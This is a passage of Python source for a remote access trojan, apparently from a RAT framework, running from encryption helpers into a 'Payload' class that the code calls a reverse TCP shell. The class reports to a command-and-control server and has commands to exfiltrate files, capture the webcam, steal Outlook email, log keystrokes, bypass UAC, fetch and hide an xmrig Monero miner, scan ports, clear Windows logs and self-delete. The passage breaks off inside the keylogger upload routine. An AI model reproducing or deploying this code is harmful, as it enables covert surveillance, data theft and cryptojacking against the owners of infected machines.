        precipherblock = [ (p ^ l) for (p, l) in zip(plaintext, self._last_cipherblock) ]
        self._last_cipherblock = self._aes.encrypt(precipherblock)

        return _bytes_to_string(self._last_cipherblock)

    def decrypt(self, ciphertext):
        if len(ciphertext) != 16:
            raise ValueError('ciphertext block must be 16 bytes')

        cipherblock = _string_to_bytes(ciphertext)
        plaintext = [ (p ^ l) for (p, l) in zip(self._aes.decrypt(cipherblock), self._last_cipherblock) ]
        self._last_cipherblock = cipherblock

        return _bytes_to_string(plaintext)


def pad(s, block_size=16):
    """
    Pad a byte string to proper block size by appending null bytes

    """
    padding = (block_size - len(bytes(s, 'utf-8')) % block_size) * chr(0) if sys.version_info[0] > 2 else (block_size - len(bytes(s)) % block_size) * chr(0)
    return s + padding

def long_to_bytes(n, blocksize=0):
    """
    Convert an integer to a byte string.

    `Required`
    :param long n:      long integer to convert to byte string

    """
    import struct
    s = b''
    n = int(n)
    while n > 0:
        s = struct.pack('>I', n & 0xffffffff) + s
        n = n >> 32
    for i in xrange(len(s)):
        if s[i] != b'\000'[0]:
            break
    else:
        s = b'\000'
        i = 0
    s = s[i:]
    if blocksize > 0 and len(s) % blocksize:
        s = (blocksize - len(s) % blocksize) * b'\000' + s
    return s

def bytes_to_long(s):
    """
    Convert a byte string to a long integer (big endian).

    `Required`
    :param str s:       byte string to convert to long integer

    """
    import struct
    acc = 0
    length = len(s)
    if length % 4:
        extra = (4 - length % 4)
        s = b'\000' * extra + s
        length = length + extra
    for i in xrange(0, length, 4):
        acc = (acc << 32) + struct.unpack('>I', s[i:i+4])[0]
    return acc

def diffiehellman(connection):
    """
    Diffie-Hellman Internet Key Exchange (RFC 2741)

    `Requires`
    :param socket connection:     socket.socket object

    Returns the 256-bit binary digest of the SHA256 hash
    of the shared session encryption key

    """
    # generator
    g  = 2

    # 2048-bit prime (group 14)
    p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF

    # 256-bit private key for local host
    a  = bytes_to_long(os.urandom(32))

    # local host public key = (generator ^ local host private key) % group 14 prime
    xA = pow(g, a, p)

    # send public key to remote host
    connection.send(long_to_bytes(xA))

    # receive remote host's public key
    xB = bytes_to_long(connection.recv(256))

    # shared key = (remote host public key ^ local host private key) % group 14 prime
    x  = pow(xB, a, p)

    return hashlib.sha256(long_to_bytes(x)).digest()

def encrypt_aes(plaintext, key):
    """
    AES-256-CBC encryption

    `Requires`
    :param str plaintext:   plain text/data
    :param str key:         session encryption key

    """
    text = pad(plaintext)
    iv = os.urandom(AESModeOfOperationCBC.block_size)
    cipher = AESModeOfOperationCBC(key, iv=iv)
    output = b''
    for x in xrange(0, len(text), AESModeOfOperationCBC.block_size):
        try:
            block = text[x:x+AESModeOfOperationCBC.block_size]
            output += cipher.encrypt(block)
        except Exception as e:
            if _debug:
                print("{0} error: {1}".format(encrypt_aes.func_name, str(e)))
    return base64.b64encode(iv + output)

def decrypt_aes(ciphertext, key):
    """
    AES-256-CBC decryption

    `Requires`
    :param str ciphertext:  encrypted block of data
    :param str key:         session encryption key

    """
    ciphertext = base64.b64decode(ciphertext)
    iv = ciphertext[:AESModeOfOperationCBC.block_size]
    ciphertext = ciphertext[len(iv):]
    cipher = AESModeOfOperationCBC(key, iv=iv)
    output = b''
    for x in xrange(0, len(ciphertext), AESModeOfOperationCBC.block_size):
        try:
            block = ciphertext[x:x+AESModeOfOperationCBC.block_size]
            output += cipher.decrypt(block)
        except Exception as e:
            if _debug:
                print("{0} error: {1}".format(decrypt_aes.func_name, str(e)))
    return output.rstrip(chr(0).encode())

def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """
    XOR-128 encryption

    `Required`
    :param str data:        plaintext
    :param str key:         256-bit key

    `Optional`
    :param int block_size:  block size
    :param int key_size:    key size
    :param int num_rounds:  number of rounds
    :param str padding:     padding character

    Returns encrypted ciphertext as base64-encoded string

    """
    data    = bytes(data.encode('utf-8'))
    data    = data + (int(block_size) - len(data) % int(block_size)) * bytes(padding.encode('utf-8'))
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = os.urandom(8)
    if len(key) < key_size:
        key += bytes(bytes(padding.encode('utf-8')) * (key_size - len(key)))
    result  = [vector]
    for block in blocks:
        if sys.version_info[0] < 3:
            block   = bytes().join(chr(ord(x) ^ ord(y)) for (x, y) in zip(vector, block))
        else:
            block   = bytes(x ^ y for (x, y) in zip(vector, block))
        v0, v1  = struct.unpack("!2L", block)
        k       = struct.unpack("!4L", key[:key_size])
        sum, delta, mask = 0, 0x9e3779b9, 0xffffffff
        for round in range(num_rounds):
            v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            sum = (sum + delta) & mask
            v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
        output  = vector = struct.pack("!2L", v0, v1)
        result.append(output)
    return base64.b64encode(bytes().join(result)).decode('utf-8')

def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
    """
    XOR-128 encryption

    `Required`
    :param str data:        ciphertext
    :param str key:         256-bit key

    `Optional`
    :param int block_size:  block size
    :param int key_size:    key size
    :param int num_rounds:  number of rounds
    :param str padding:     padding character

    Returns decrypted plaintext as string

    """
    data    = base64.b64decode(data)
    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
    vector  = blocks[0]
    if len(key) < key_size:
        key += bytes(bytes(padding.encode('utf-8')) * (key_size - len(key)))
    result  = []
    for block in blocks[1:]:
        v0, v1  = struct.unpack("!2L", block)
        k0      = struct.unpack("!4L", key[:key_size])
        delta, mask = 0x9e3779b9, 0xffffffff
        sum     = (delta * num_rounds) & mask
        for round in range(num_rounds):
            v1  = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k0[sum >> 11 & 3]))) & mask
            sum = (sum - delta) & mask
            v0  = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k0[sum & 3]))) & mask
        decode  = struct.pack("!2L", v0, v1)
        if sys.version_info[0] < 3:
            output   = bytes().join(chr(ord(x) ^ ord(y)) for (x, y) in zip(vector, decode))
        else:
            output   = bytes(x ^ y for (x, y) in zip(vector, decode))
        vector  = block
        result.append(output.decode('utf-8'))
    return str().join(result).rstrip(padding)


_abort = False
_debug = '--debug' in sys.argv


class Payload():
    """
    Reverse TCP shell designed to provide remote access
    to the host's terminal, enabling direct control of the
    device from a remote server.

    """

    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
        """
        Create a reverse TCP shell instance

        `Required`
        :param str host:          server IP address
        :param int port:          server port number

        """
        self.handlers = {}
        self.child_procs = {}
        self.remote = {'modules': [], 'packages': ['cv2','requests','pyHook','pyxhook','mss']}
        self.gui = True if kwargs.get('gui') else False
        self.owner = kwargs.get('owner')
        self.flags = self._get_flags()
        self.c2 = (host, port)
        self.connection = self._get_connection(host, port)
        self.key = self._get_key(self.connection)
        self.info = self._get_info()
        self.xmrig_path = None
        self.xmrig_path_dev = None

    def _get_flags(self):
        return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())

    def _get_command(self, cmd):
        if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
            return getattr(self, cmd)
        return False

    def _get_connection(self, host, port):
        while True:
            try:
                connection = socket.create_connection((host, port))
                break
            except (socket.error, socket.timeout):
                log("Unable to connect to server. Retrying in 30 seconds...")
                time.sleep(30)
                continue
            except Exception as e:
                log("{} error: {}".format(self._get_connection.__name__, str(e)))
                sys.exit()
        self.flags.connection.set()
        self.flags.passive.clear()
        return connection

    def _get_key(self, connection):
        if isinstance(connection, socket.socket):
            if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
                return globals()['diffiehellman'](connection)
            else:
                raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
        else:
            raise TypeError("invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket, type(connection)))

    def _get_info(self):
        info = {}
        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            try:
                info[function] = globals()[function]()
                if isinstance(info[function], bytes):
                    info[function] = "_b64__" + base64.b64encode(info[function]).decode('ascii')
            except Exception as e:
                log("{} returned error: {}".format(function, str(e)))

        # add owner of session for web application
        info['owner'] = "_b64__" + base64.b64encode(self.owner.encode('utf-8')).decode('ascii')

        # add geolocation of host machine
        latitude, longitude = globals()['geolocation']()
        info['latitude'] = "_b64__" + base64.b64encode(latitude.encode('utf-8')).decode('ascii')
        info['longitude'] = "_b64__" + base64.b64encode(longitude.encode('utf-8')).decode('ascii')

        # encrypt and send data to server
        data = globals()['encrypt_aes'](json.dumps(info), self.key)
        msg = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return info

    @threaded
    def _get_resources(self, target=None, base_url=None):
        if sys.version_info[0] < 3:
            from urllib import urlretrieve
            from urllib2 import urlopen, urlparse
            import StringIO
        else:
            from urllib import parse as urlparse
            from urllib.request import urlopen, urlretrieve
            from io import StringIO
        try:
            if not isinstance(target, list):
                raise TypeError("keyword argument 'target' must be type 'list'")
            if not isinstance(base_url, str):
                raise TypeError("keyword argument 'base_url' must be type 'str'")
            if not base_url.startswith('http'):
                raise ValueError("keyword argument 'base_url' must start with http:// or https://")
            log('[*] Searching %s' % base_url)
            path = urlparse.urlsplit(base_url).path
            base = path.strip('/').replace('/','.')
            names = []
            for line in urlopen(base_url).read().splitlines():
                line = str(line)
                if 'href' in line and '</a>' in line and '__init__.py' not in line:
                    names.append(line.rpartition('</a>')[0].rpartition('>')[2].strip('/'))
            for n in names:
                name, ext = os.path.splitext(n)
                if ext in ('.py','.pyc'):
                    module = '.'.join((base, name)) if base else name
                    if module not in target:
                        log("[+] Adding %s" % module)
                        target.append(module)
                elif not len(ext):
                    t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
                    t.daemon = True
                    t.start()
                else:
                    resource = '/'.join((path, n))
                    if resource not in target:
                        target.append(resource)
        except Exception as e:
            log("{} error: {}".format(self._get_resources.__name__, str(e)))

    @threaded
    def _get_prompt_handler(self):
        self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
        while True:
            try:
                self.flags.prompt.wait()
                self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
                self.flags.prompt.clear()
                if globals()['_abort']:
                    break
            except Exception as e:
                log(str(e))
                break

    @threaded
    def _get_thread_handler(self):
        while True:
            jobs = self.handlers.items()
            deadpool = []
            for task, worker in jobs:
                if worker:
                    try:
                        if not worker.is_alive():
                            deadpool.append(task)
                    except Exception as e:
                        log(str(e))
            for task in deadpool:
                dead = self.handlers.pop(task, None)
                del dead
            if globals()['_abort']:
                break
            time.sleep(0.5)

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        Change current working directory

        `Optional`
        :param str path:  target directory (default: current directory)

        """
        try:
            os.chdir(path)
            return os.getcwd()
        except:
            return "{}: No such file or directory".format(path)

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        List the contents of a directory

        `Optional`
        :param str path:  target directory

        """
        output = []
        if os.path.isdir(path):
            for line in os.listdir(path):
                if len('\n'.join(output + [line])) < 2048:
                    output.append(line)
                else:
                    break
            return '\n'.join(output)
        else:
            return "Error: path not found"


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        Display file contents

        `Required`
        :param str path:  target filename

        """
        output = []
        if not os.path.isfile(path):
            return "Error: file not found"
        for line in open(path, 'rb').read().splitlines():
            if len(line) and not line.isspace():
                if len('\n'.join(output + [line])) < 48000:
                    output.append(line)
                else:
                    break
        return '\n'.join(output)


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='pwd')
    def pwd(self, *args):
        """
        Show name of present working directory

        """
        return os.getcwd()

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        Execute Python code in current context

        `Required`
        :param str code:        string of Python code to execute

        """
        try:
            return eval(code)
        except Exception as e:
            return "{} error: {}".format(self.eval.__name__, str(e))

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        Download file from URL

        `Required`
        :param str url:         target URL to download ('http://...')

        `Optional`
        :param str filename:    name of the file to save the file as

        """
        if sys.version_info[0] < 3:
            from urllib import urlretrieve
            from urllib2 import urlopen, urlparse
            import StringIO
        else:
            from urllib import parse as urlparse
            from urllib.request import urlopen, urlretrieve
        if url.startswith('http'):
            try:
                path, _ = urlretrieve(url, filename) if filename else urlretrieve(url)
                return path
            except Exception as e:
                log("{} error: {}".format(self.wget.__name__, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """
        Shutdown the current connection

        """
        try:
            self.flags.connection.clear()
            self.flags.passive.clear()
            self.flags.prompt.clear()
            self.connection.close()

            # kill threads
            for thread in list(self.handlers):
                try:
                    self.stop(thread)
                except Exception as e:
                    log("{} error: {}".format(self.kill.__name__, str(e)))

            # kill sub processes (subprocess.Popen)
            for proc in self.execute.process_list.values():
                try:
                    proc.kill()
                except: pass

            # kill child processes (multiprocessing.Process)
            for child_proc in self.child_procs.values():
                try:
                    child_proc.terminate()
                except: pass
        except Exception as e:
            log("{} error: {}".format(self.kill.__name__, str(e)))

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='help [cmd]')
    def help(self, name=None):
        """
        Show usage help for commands and modules

        `Optional`
        :param str command:      name of a command or module

        """
        if not name:
            try:
                return json.dumps({v.usage: v.__doc__.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
            except Exception as e:
                log("{} error: {}".format(self.help.__name__, str(e)))
        elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
            try:
                return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).__doc__})
            except Exception as e:
                log("{} error: {}".format(self.help.__name__, str(e)))
        else:
            return "'{}' is not a valid command and is not a valid module".format(name)

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='load <module> [target]')
    def load(self, args):
        """
        Remotely import a module or package

        `Required`
        :param str module:  name of module/package

        `Optional`
        :param str target:  name of the target destination (default: globals)

        """
        args = str(args).split()
        if len(args) == 1:
            module, target = args[0], ''
        elif len(args) == 2:
            module, target = args
        else:
            return "usage: {}".format(self.load.usage)
        target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
        host, port = self.connection.getpeername()
        base_url_1 = 'http://{}:{}'.format(host, port + 1)
        base_url_2 = 'http://{}:{}'.format(host, port + 2)
        with globals()['remote_repo'](self.remote['packages'], base_url_2):
            with globals()['remote_repo'](self.remote['modules'], base_url_1):
                try:
                    exec('import {}'.format(module), target)
                    log('[+] {} remotely imported'.format(module))
                    return '[+] {} remotely imported'.format(module)
                except Exception as e:
                    log("{} error: {}".format(self.load.__name__, str(e)))
                    return "{} error: {}".format(self.load.__name__, str(e))

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        Stop a running job

        `Required`
        :param str target:    name of job to stop
        """
        try:
            if target in self.handlers:
                _ = self.handlers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            log("{} error: {}".format(self.stop.__name__, str(e)))

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        Show value of an attribute

        `Required`
        :param str attribute:    payload attribute to show

        Returns attribute(s) as a dictionary (JSON) object

        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: status(self.handlers[a].name) for a in self.handlers if self.handlers[a].is_alive()})
            elif 'info' in attribute:
                return json.dumps(self.info)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            log("'{}' error: {}".format(self.show.__name__, str(e)))

    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
    def abort(self, *args):
        """
        Abort execution and self-destruct

        """
        globals()['_abort'] = True
        try:
            if os.name == 'nt':
                clear_system_logs()
            if 'persistence' in globals():
                global persistence
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(persistence, 'remove_{}'.format(method))()
                        except Exception as e2:
                            log("{} error: {}".format(method, str(e2)))
            if not _debug:
                delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.connection.close)
            taskkill = threading.Thread(target=self.process, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()

    @config(platforms=['darwin'], command=True, usage='icloud')
    def icloud(self):
        """
        Check for logged in iCloud account on macOS

        """
        if 'icloud' not in globals():
            self.load('icloud')
        return globals()['icloud'].run()

    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [port] [wallet]')
    def miner(self, args):
        """
        Run cryptocurrency miner in the background

        `Required`
        :param str url:         mining server url
        :param str username:    username for mining server
        """
        args = str(args).split()

        if 'run' in args and len(args) == 4:
            cmd, url, port, user = args

            # type check port argument
            if not port.isdigit():
                return "Error: port must be a digit 1-65535"

            # first attempt using built-in python miner
            try:
                raise Exception
                import pycryptonight, pyrx
                if 'miner_py' in self.child_procs:
                    try:
                        self.child_procs['miner_py'].terminate()
                    except:pass
                self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
                self.child_procs['miner_py'].start()
                return "Miner running in PID " + str(self.child_procs['miner_py'].pid)
            except Exception as e:
                log("{} error: {}".format(self.miner.__name__, str(e)))

                # if that fails, try downloading and running xmrig
                try:
                    threads = multiprocessing.cpu_count() - 1

                    # pull xmrig from server if necessary
                    if not self.xmrig_path:
                        self.xmrig_path = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))

                        # set up executable
                        if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
                            os.rename(self.xmrig_path, self.xmrig_path + '.exe')
                            self.xmrig_path += '.exe'

                        os.chmod(self.xmrig_path, 755)

                        # excute xmrig in hidden process
                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
                        result = self.execute(params)
                        return result
                    else:
                        # restart miner if it already exists
                        name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
                        if name in self.execute.process_list:
                            self.execute.process_list[name].kill()
                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
                        result = self.execute(params)
                        return result
                except Exception as e:
                    log("{} error: {}".format(self.miner.__name__, str(e)))
                    return "{} error: {}".format(self.miner.__name__, str(e))

        elif 'stop' in args:
            # kill python miner
            if 'miner_py' in self.child_procs and isinstance(self.child_procs['miner_py'], multiprocessing.Process) and self.child_procs['miner_py'].is_alive():
                self.child_procs['miner_py'].terminate()

            # kill xmrig
            name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
            if name in self.execute.process_list:
                self.execute.process_list[name].kill()

            return "Miner stopped."

        return "usage: {}".format(self.miner.usage)


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
    def upload(self, filename):
        """
        Upload file from client machine to the C2 server

        `Required`
        :param str source:      filename

        """
        try:
            if os.path.isfile(filename):
                host, port = self.connection.getpeername()
                _, filetype = os.path.splitext(filename)
                with open(filename, 'rb') as fp:
                    data = base64.b64encode(fp.read())
                json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
                
                # upload data to server
                if self.gui:
                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
                else:
                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                return "Upload complete (see Exfiltrated Files tab to download file)"
            else:
                return "Error: file not found"
        except Exception as e:
            log("{} error: {}".format(self.upload.__name__, str(e)))
            return "Error: {}".format(str(e))


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        Capture image/video from client webcam

        `Required`
        :param str mode:      stream, image, video

        `Optional`
        :param str upload:    imgur (image mode), ftp (video mode)
        :param int port:      integer 1 - 65355 (stream mode)

        """
        try:
            host, port = self.connection.getpeername()

            if 'webcam' not in globals():
                self.load('webcam')
            if not args:
                return self.webcam.usage

            args = str(args).split()

            if 'stream' in args:
                if len(args) != 2:
                    log("Error - stream mode requires argument: 'port'")
                elif not args[1].isdigit():
                    log("Error - port must be integer between 1 - 65355")
                else:
                    host, _ = self.connection.getpeername()
                    port = int(args[1])
                    globals()['webcam'].stream(host=host, port=port)

            elif 'image' in args:
                data = globals()['webcam'].image(*args)
                json_data = {"data": str(data), "type": "png", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
                
                # upload data to server
                if self.gui:
                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
                else:
                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)

            elif 'video' in args:
                data = globals()['webcam'].video(*args)
                json_data = {"data": str(data), "type": "avi", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}

                # upload data to server
                if self.gui:
                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
                else:
                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)

            else:
                return self.webcam.usage
            return "Webcam capture complete  (see Exfiltrated Files tab to download file)"
        except Exception as e:
            log("{} error: {}".format(self.webcam.__name__, str(e)))


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='passive')
    def passive(self):
        """
        Keep client alive while waiting to re-connect

        """
        log("{} : Bot entering passive mode awaiting C2.".format(self.passive.__name__))
        self.flags.connection.clear()
        self.flags.passive.set()


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """
        Restart the shell

        """
        try:
            log("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
        except Exception as e:
            log("{} error: {}".format(self.restart.__name__, str(e)))


    @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """
        Access Outlook email in the background

        `Required`
        :param str mode:    installed, run, count, search, upload

        """
        if 'outlook' not in globals():
            self.load('outlook')
        elif not args:
            try:
                if not globals()['outlook'].installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(globals()['outlook'], mode):

                    if 'run' in mode:
                        self.handlers['outlook'] = globals()['outlook'].run()
                        return "Fetching emails from Outlook inbox..."

                    elif 'upload' in mode:
                        results = globals()['outlook'].results
                        if len(results):
                            host, port = self.connection.getpeername()
                            data = base64.b64encode(json.dumps(results))
                            json_data = {'data': str(data), 'type': 'txt', 'owner': self.owner, "module": self.outlook.__name__, "session": self.info.get('public_ip')}
                
                            # upload data to server
                            if self.gui:
                                globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
                            else:
                                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)                            
                            return "Upload of Outlook emails complete  (see Exfiltrated Files tab to download files)"
                    elif hasattr(globals()['outlook'], mode):
                        return getattr(globals()['outlook'], mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return self.outlook.usage
            except Exception as e:
                log("{} error: {}".format(self.email.__name__, str(e)))


    @config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        Attempt UAC bypass to escalate privileges

        """
        try:
            if 'escalate' not in globals():
                self.load('escalate')
            return globals()['escalate'].run(sys.argv[0])
        except Exception as e:
            log("{} error: {}".format(self.escalate.__name__, str(e)))


    @config(platforms=['win32','linux','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """
        Run an executable program in a hidden process

        `Required`
        :param str path:    file path of the target program

        `Optional`
        :param str args:    arguments for the target program

        """
        log(args)
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                # attempt to run hidden process
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                # revert to normal process if hidden process fails
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    log("{} error: {}".format(self.execute.__name__, str(e)))
                    return "{} error: {}".format(self.execute.__name__, str(e))
        else:
            return "File '{}' not found".format(str(path))


    @config(platforms=['win32'], command=True, usage='process <mode>')
    def process(self, args=None):
        """
        Utility method for interacting with processes

        `Required`
        :param str mode:    block, list, monitor, kill, search, upload

        `Optional`
        :param str args:    arguments specific to the mode

        """
        try:
            if 'process' not in globals():
                self.load('process')
            if args:
                cmd, _, action = str(args).partition(' ')
                if 'monitor' in cmd:
                    self.handlers['process_monitor'] = globals()['process'].monitor(action)
                    return "Monitoring process creation for keyword: {}".format(action)
                elif 'upload' in cmd:
                    log = globals()['process'].log.getvalue()
                    if len(log):
                        host, port = self.connection.getpeername()
                        data = base64.b64encode(log)
                        json_data = {'data': str(data), 'type': 'log', 'owner': self.owner, "module": self.process.__name__, "session": self.info.get('public_ip')}
            
                        # upload data to server
                        if self.gui:
                            globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
                        else:
                            globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                        return "Process log upload complete  (see Exfiltrated Files tab to download file)"
                    else:
                        return "Process log is empty"
                elif hasattr(globals()['process'], cmd):
                    return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
            return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
        except Exception as e:
            log("{} error: {}".format(self.process.__name__, str(e)))


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='portscanner <target>')
    def portscanner(self, target=None):
        """
        Scan a target host or network to identify
        other target hosts and open ports.

        `Required`
        :param str target:      IPv4 address

        """
        if 'portscanner' not in globals():
            self.load('portscanner')
        try:
            if target:
                if not ipv4(target):
                    return "Error: invalid IP address '%s'" % target
                return globals()['portscanner'].run(target)
            else:
                return self.portscanner.usage
        except Exception as e:
            log("{} error: {}".format(self.portscanner.__name__, str(e)))


    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='keylogger [mode]')
    def keylogger(self, mode=None):
        """
        Log user keystrokes

        `Required`
        :param str mode:    run, stop, status, upload

        """
        def status():
            try:
                length = globals()['keylogger'].logs.tell()
                return "Log size: {} bytes".format(length)
            except Exception as e:
                log("{} error: {}".format('keylogger.status', str(e)))
        if 'keylogger' not in globals():
            self.load('keylogger')
        if not mode:
            if 'keylogger' not in self.handlers:
                return globals()['keylogger'].usage
            else:
                return locals()['status']()
        else:
            if 'run' in mode or 'start' in mode:
                if 'keylogger' not in self.handlers:
                    self.handlers['keylogger'] = globals()['keylogger'].run()
                    return locals()['status']()
                else:
                    return locals()['status']()
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except: pass
                try:
                    self.stop('keylogger')
                except: pass
                return locals()['status']()
            elif 'upload' in mode:
                host, port = self.connection.getpeername()
                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
                json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}

                # upload data to server
                if self.gui:
                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
                else:
                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)

                globals()['keylogger'].logs.reset()
